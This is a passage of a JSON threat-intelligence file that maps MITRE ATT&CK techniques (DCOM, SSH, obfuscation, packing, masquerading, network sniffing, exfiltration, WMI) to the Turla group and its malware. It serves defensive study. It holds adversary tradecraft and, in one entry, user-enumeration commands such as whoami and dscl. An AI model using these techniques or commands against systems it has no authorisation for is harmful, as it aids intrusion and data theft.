Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)",
    "technique_references": [
      {
        "source_name": "Fireeye Hunting COM June 2019",
        "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
        "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COM",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
        "description": "Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Process Wide Com Keys",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx",
        "description": "Microsoft. (n.d.). Setting Process-Wide Security Through the Registry. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COM ACL",
        "url": "https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1",
        "description": "Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Outlook DCOM Lateral Movement Nov 2017",
        "url": "https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",
        "description": "Nelson, M. (2017, November 16). Lateral Movement using Outlook's CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma MMC20 COM Jan 2017",
        "url": "https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",
        "description": "Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma DCOM Lateral Movement Jan 2017",
        "url": "https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/",
        "description": "Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round 2. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Excel DCOM Sept 2017",
        "url": "https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/",
        "description": "Nelson, M. (2017, September 11). Lateral Movement using Excel.Application and DCOM. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Cyberreason DCOM DDE Lateral Movement Nov 2017",
        "url": "https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom",
        "description": "Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral movement via DCOM. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN WMI",
        "url": "https://msdn.microsoft.com/en-us/library/aa394582.aspx",
        "description": "Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6",
    "platform": "linux|macos",
    "tid": "T1021.004",
    "technique": "SSH",
    "tactic": "lateral-movement",
    "datasources": "logon-session-creation|network-connection-creation|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/555.html",
        "description": "none",
        "external_id": "CAPEC-555"
      },
      {
        "source_name": "Apple Unified Log Analysis Remote Login and Screen Sharing",
        "url": "https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins",
        "description": "Sarah Edwards. (2020, April 30). Analysis of Apple Unified Logs: Quarantine Edition [Entry 6] – Working From Home? Remote Logins. Retrieved August 19, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec",
    "platform": "linux|macos|windows",
    "tid": "T1025",
    "technique": "Data from Removable Media",
    "tactic": "collection",
    "datasources": "command-execution|file-access",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "crutch",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. \n\nSome adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.",
    "technique_references": [],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
    "platform": "linux|macos|windows",
    "tid": "T1027",
    "technique": "Obfuscated Files or Information",
    "tactic": "defense-evasion",
    "datasources": "command-execution|file-creation|file-metadata|process-creation",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1027.001",
      "T1027.003",
      "T1027.004"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|epic|gazer|kazuar|lightneuron|mosquito|penquin|powerstallion",
    "correlation_tool": "empire|ironnetinjector",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
    "technique_references": [
      {
        "source_name": "Volexity PowerDuke November 2016",
        "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/",
        "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Revoke-Obfuscation",
        "url": "https://github.com/danielbohannon/Revoke-Obfuscation",
        "description": "Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Obfuscation June 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html",
        "description": "Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Revoke-Obfuscation July 2017",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf",
        "description": "Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Office-Crackros Aug 2016",
        "url": "https://github.com/itsreallynick/office-crackros",
        "description": "Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Linux/Cdorked.A We Live Security Analysis",
        "url": "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/",
        "description": "Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Carbon Black Obfuscation Sept 2016",
        "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/",
        "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "PaloAlto EncodedCommand March 2017",
        "url": "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
        "description": "White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/267.html",
        "description": "none",
        "external_id": "CAPEC-267"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--deb98323-e13f-4b0c-8d94-175379069062",
    "platform": "macos|windows|linux",
    "tid": "T1027.002",
    "technique": "Software Packing",
    "tactic": "defense-evasion",
    "datasources": "file-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "uroburos",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  ",
    "technique_references": [
      {
        "source_name": "Awesome Executable Packing",
        "url": "https://github.com/dhondta/awesome-executable-packing",
        "description": "Alexandre D'Hondt. (n.d.). Awesome Executable Packing. Retrieved March 11, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "ESET FinFisher Jan 2018",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf",
        "description": "Kafka, F. (2018, January). ESET's Guide to Deobfuscating and Devirtualizing FinFisher. Retrieved August 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/570.html",
        "description": "none",
        "external_id": "CAPEC-570"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92",
    "platform": "linux|macos|windows",
    "tid": "T1027.005",
    "technique": "Indicator Removal from Tools",
    "tactic": "defense-evasion",
    "datasources": "application-log-content",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "penquin",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
    "technique_references": [],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
    "platform": "linux|macos|windows",
    "tid": "T1029",
    "technique": "Scheduled Transfer",
    "tactic": "exfiltration",
    "datasources": "network-connection-creation|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "comrat|kazuar|lightneuron|tinyturla",
    "correlation_tool": "",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
    "technique_references": [],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
    "platform": "linux|macos|windows",
    "tid": "T1033",
    "technique": "System Owner/User Discovery",
    "tactic": "discovery",
    "datasources": "active-directory-object-access|command-execution|file-access|network-traffic-content|network-traffic-flow|os-api-execution|process-access|process-creation|windows-registry-key-access",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic|gazer|kazuar|mosquito",
    "correlation_tool": "nbtscan",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/577.html",
        "description": "none",
        "external_id": "CAPEC-577"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c",
    "platform": "windows|linux|macos",
    "tid": "T1036.004",
    "technique": "Masquerade Task or Service",
    "tactic": "defense-evasion",
    "datasources": "command-execution|scheduled-job-metadata|scheduled-job-modification|service-creation|service-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "comrat|crutch|tinyturla",
    "correlation_tool": "ironnetinjector",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",
    "technique_references": [
      {
        "source_name": "TechNet Schtasks",
        "url": "https://technet.microsoft.com/en-us/library/bb490996.aspx",
        "description": "Microsoft. (n.d.). Schtasks. Retrieved April 28, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Systemd Service Units",
        "url": "https://www.freedesktop.org/software/systemd/man/systemd.service.html",
        "description": "Freedesktop.org. (n.d.). systemd.service — Service unit configuration. Retrieved March 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Palo Alto Shamoon Nov 2016",
        "url": "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/",
        "description": "Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Fysbis Dr Web Analysis",
        "url": "https://vms.drweb.com/virus/?i=4276269",
        "description": "Doctor Web. (2014, November 21). Linux.BackDoor.Fysbis.1. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2",
    "platform": "linux|macos|windows|containers",
    "tid": "T1036.005",
    "technique": "Match Legitimate Name or Location",
    "tactic": "defense-evasion",
    "datasources": "file-metadata|image-metadata|process-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "lightneuron|penquin|tinyturla",
    "correlation_tool": "",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
    "technique_references": [
      {
        "source_name": "Twitter ItsReallyNick Masquerading Update",
        "url": "https://twitter.com/ItsReallyNick/status/1055321652777619457",
        "description": "Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Docker Images",
        "url": "https://docs.docker.com/engine/reference/commandline/images/",
        "description": "Docker. (n.d.). Docker Images. Retrieved April 6, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic Masquerade Ball",
        "url": "http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf",
        "description": "Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/177.html",
        "description": "none",
        "external_id": "CAPEC-177"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
    "platform": "linux|macos|windows|network|iaas",
    "tid": "T1040",
    "technique": "Network Sniffing",
    "tactic": "credential-access",
    "datasources": "command-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "penquin",
    "correlation_tool": "empire|nbtscan",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring) (Citation: GCP Packet Mirroring) (Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring) (Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic. (Citation: Rhino Security Labs AWS VPC Traffic Mirroring)",
    "technique_references": [
      {
        "source_name": "AWS Traffic Mirroring",
        "url": "https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html",
        "description": "Amazon Web Services. (n.d.). How Traffic Mirroring works. Retrieved March 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "GCP Packet Mirroring",
        "url": "https://cloud.google.com/vpc/docs/packet-mirroring",
        "description": "Google Cloud. (n.d.). Packet Mirroring overview. Retrieved March 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "SpecterOps AWS Traffic Mirroring",
        "url": "https://posts.specterops.io/through-the-looking-glass-part-1-f539ae308512",
        "description": "Luke Paine. (2020, March 11). Through the Looking Glass — Part 1. Retrieved March 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Azure Virtual Network TAP",
        "url": "https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview",
        "description": "Microsoft. (2022, February 9). Virtual network TAP. Retrieved March 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Rhino Security Labs AWS VPC Traffic Mirroring",
        "url": "https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/",
        "description": "Spencer Gietzen. (2019, September 17). Abusing VPC Traffic Mirroring in AWS. Retrieved March 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/158.html",
        "description": "none",
        "external_id": "CAPEC-158"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
    "platform": "linux|macos|windows|network|iaas",
    "tid": "T1040",
    "technique": "Network Sniffing",
    "tactic": "discovery",
    "datasources": "command-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "penquin",
    "correlation_tool": "empire|nbtscan",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring) (Citation: GCP Packet Mirroring) (Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring) (Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic. (Citation: Rhino Security Labs AWS VPC Traffic Mirroring)",
    "technique_references": [
      {
        "source_name": "AWS Traffic Mirroring",
        "url": "https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html",
        "description": "Amazon Web Services. (n.d.). How Traffic Mirroring works. Retrieved March 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "GCP Packet Mirroring",
        "url": "https://cloud.google.com/vpc/docs/packet-mirroring",
        "description": "Google Cloud. (n.d.). Packet Mirroring overview. Retrieved March 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "SpecterOps AWS Traffic Mirroring",
        "url": "https://posts.specterops.io/through-the-looking-glass-part-1-f539ae308512",
        "description": "Luke Paine. (2020, March 11). Through the Looking Glass — Part 1. Retrieved March 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Azure Virtual Network TAP",
        "url": "https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview",
        "description": "Microsoft. (2022, February 9). Virtual network TAP. Retrieved March 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Rhino Security Labs AWS VPC Traffic Mirroring",
        "url": "https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/",
        "description": "Spencer Gietzen. (2019, September 17). Abusing VPC Traffic Mirroring in AWS. Retrieved March 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/158.html",
        "description": "none",
        "external_id": "CAPEC-158"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d",
    "platform": "linux|macos|windows",
    "tid": "T1041",
    "technique": "Exfiltration Over C2 Channel",
    "tactic": "exfiltration",
    "datasources": "command-execution|file-access|network-connection-creation|network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "crutch|lightneuron|penquin",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
    "platform": "windows",
    "tid": "T1047",
    "technique": "Windows Management Instrumentation",
    "tactic": "execution",
    "datasources": "command-execution|network-connection-creation|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "kazuar|mosquito",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)",
    "technique_references": [
      {
        "source_name": "FireEye WMI 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
        "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WMI SANS 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf",
        "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
